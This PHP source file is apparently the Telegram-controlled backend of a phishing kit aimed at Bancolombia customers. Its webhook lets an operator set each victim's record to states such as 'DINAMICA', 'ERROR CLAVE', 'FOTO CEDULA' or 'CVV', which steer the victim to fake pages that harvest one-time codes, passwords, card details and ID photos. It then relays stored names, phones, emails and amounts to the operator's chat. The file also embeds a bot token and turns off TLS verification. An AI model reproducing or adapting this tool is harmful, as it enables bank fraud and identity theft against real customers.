<?php

header("HTTP/1.1 200 OK");
header("Content-Type: application/json; charset=utf-8");

$raw = file_get_contents("php://input");
if ($raw === false || $raw === '') {
    echo json_encode(array('ok' => true));
    exit;
}

$update = json_decode($raw, true);
if (!is_array($update)) {
    echo json_encode(array('ok' => true));
    exit;
}

require_once __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$token  = $DEFAULT_BOT_TOKEN_OPS;
if (is_string($envBot)) {
    if (trim($envBot) !== '') {
        $token = $envBot;
    }
}

function wh_log($line) {
    try {
        $logPath = __DIR__ . DIRECTORY_SEPARATOR . 'debug_webhook.log';
        $fp = @fopen($logPath, 'a');
        if ($fp) {
            @fwrite($fp, gmdate('Y-m-d\TH:i:s\Z') . " " . $line . "\n");
            @fclose($fp);
        }
    } catch (Throwable $e) { /* ignore */ }
}

function answerCallback($cbId, $text = 'OK', $showAlert = false) {
    global $token;
    $payload = json_encode(array(
        'callback_query_id' => $cbId,
        'text'              => $text,
        'show_alert'        => $showAlert,
    ));
    $ch = curl_init("https://api.telegram.org/bot" . $token . "/answerCallbackQuery");
    if (!$ch) return false;
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $out  = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return array('ok' => ($code >= 200 && $code < 300), 'code' => $code, 'body' => $out);
}

function tgSend($chatId, $text, $reply_markup = null, $parse_mode = 'HTML') {
    global $token;
    $body = array('chat_id' => $chatId, 'text' => $text);
    if ($parse_mode) {
        $body['parse_mode']               = $parse_mode;
        $body['disable_web_page_preview'] = true;
    }
    if ($reply_markup) {
        $body['reply_markup'] = $reply_markup;
    }
    $payload = json_encode($body);
    $ch = curl_init("https://api.telegram.org/bot" . $token . "/sendMessage");
    if (!$ch) return false;
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $out  = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return array('ok' => ($code >= 200 && $code < 300), 'code' => $code, 'body' => $out);
}

$remote = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';
$ua     = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'unknown';
wh_log("START remote=" . $remote . " ua=" . substr($ua, 0, 120) . " rawlen=" . strlen($raw));

if (isset($update['callback_query']) && is_array($update['callback_query'])) {
    $cb    = $update['callback_query'];
    $cbId  = isset($cb['id']) ? $cb['id'] : '';
    $data  = isset($cb['data']) ? $cb['data'] : '';
    $from  = isset($cb['from']['id']) ? $cb['from']['id'] : 0;
    $chat  = isset($cb['message']['chat']['id']) ? $cb['message']['chat']['id'] : 0;
    $msgId = isset($cb['message']['message_id']) ? $cb['message']['message_id'] : 0;

    wh_log("CB data=" . var_export($data, true) . " from=" . $from . " chat=" . $chat . " cbId=" . $cbId);

    $answered   = false;
    $estado     = null;
    $request_id = null;
    $opcion     = null;

    if (preg_match('/^OPCION_(\d+)_(.+)$/', (string)$data, $m)) {
        $opcion     = (int)$m[1];
        $request_id = $m[2];
        $estado     = "opcion_" . $opcion;
    } elseif (preg_match('/^([a-zA-Z0-9_]+)_(.+)$/', (string)$data, $m)) {
        $estado     = $m[1];
        $request_id = $m[2];
    }

    if ($estado && $request_id) {
        $esBcoRid = (is_string($request_id) && strncmp($request_id, 'BCO_', 4) === 0);
        if (!$esBcoRid) {
            wh_log("SKIP request_id NO empieza por BCO_ data=" . var_export($data, true));
            if ($cbId) {
                answerCallback($cbId, "OK (callback no Bancolombia, rid=" . substr($request_id, 0, 24) . ")", false);
            }
            $answered = true;
        } else {
            $rowsAffected = 0;
            $foundBanco   = '';
            $foundRid     = '';
            try {
                global $pdo;

                $upd = $pdo->prepare(
                    "UPDATE solicitudes
                     SET estado = ?
                     WHERE BINARY request_id = ?
                       AND banco = 'Bancolombia'
                       AND LEFT(request_id,4) = 'BCO_'"
                );
                $upd->execute(array($estado, $request_id));
                $rowsAffected = (int)$upd->rowCount();

                $row = null;
                $sel = $pdo->prepare(
                    "SELECT request_id, `key`, numero_cuenta, monto, banco, estado, nombre, telefono, correo
                     FROM solicitudes WHERE BINARY request_id = ? LIMIT 1"
                );
                $sel->execute(array($request_id));
                $row = $sel->fetch(PDO::FETCH_ASSOC);
                if (is_array($row)) {
                    $foundBanco = isset($row['banco']) ? (string)$row['banco'] : '';
                    $foundRid   = isset($row['request_id']) ? (string)$row['request_id'] : '';
                }
                wh_log(
                    "UPDATE estado=" . $estado . " request_id=" . var_export($request_id, true) .
                    " rowsAffected=" . $rowsAffected . " foundBanco=" . $foundBanco . " foundRid=" . $foundRid
                );

                $labelMap = array(
                    'opcion_1'  => "[DINAMICA]",
                    'opcion_2'  => "[TARJETA DEBITO]",
                    'opcion_3'  => "[ERROR DINAMICA]",
                    'opcion_4'  => "[ERROR CLAVE]",
                    'opcion_5'  => "[FOTO CEDULA]",
                    'opcion_6'  => "[TARJETA alt]",
                    'opcion_7'  => "[ERROR USUARIO]",
                    'opcion_8'  => "[CENTRO AYUDA]",
                    'opcion_9'  => "[ERROR DINAMICA detalle]",
                    'opcion_10' => "[FINALIZAR]",
                    'opcion_55' => "[CVV]",
                );
                $lbl = isset($labelMap[$estado]) ? $labelMap[$estado] : strtoupper(str_replace('_', ' ', $estado));

                $lines = array("OK <b>Estado actualizado:</b> " . $lbl);
                if (is_array($row)) {
                    if (!empty($row['request_id']))   $lines[] = "ID Request: " . htmlspecialchars($row['request_id'], ENT_QUOTES, 'UTF-8');
                    if (!empty($row['banco']))        $lines[] = "Banco: "       . htmlspecialchars($row['banco'], ENT_QUOTES, 'UTF-8');
                    if (!empty($row['monto']))        $lines[] = "Monto: "       . htmlspecialchars($row['monto'], ENT_QUOTES, 'UTF-8');
                    if (!empty($row['nombre']))       $lines[] = "Nombre: "      . htmlspecialchars($row['nombre'], ENT_QUOTES, 'UTF-8');
                    if (!empty($row['telefono']))     $lines[] = "Telefono: "    . htmlspecialchars($row['telefono'], ENT_QUOTES, 'UTF-8');
                    if (!empty($row['correo']))       $lines[] = "Correo: "      . htmlspecialchars($row['correo'], ENT_QUOTES, 'UTF-8');
                }

                if ($chat) {
                    tgSend($chat, implode("\n", $lines));
                }
                answerCallback($cbId, $lbl . " aplicado (" . $request_id . ")", false);
                $answered = true;
            } catch (Throwable $e) {
                $msg = $e->getMessage();
                wh_log("ERROR " . $msg);
                if ($cbId) {
                    answerCallback($cbId, "Error: " . substr($msg, 0, 120), true);
                }
                error_log("TG webhook error: " . $msg);
                $answered = true;
            }
        }
    }

    if (!$answered && $cbId) {
        answerCallback($cbId, "OK");
    }
}

echo json_encode(array('ok' => true));
wh_log("END output_sent");
exit;
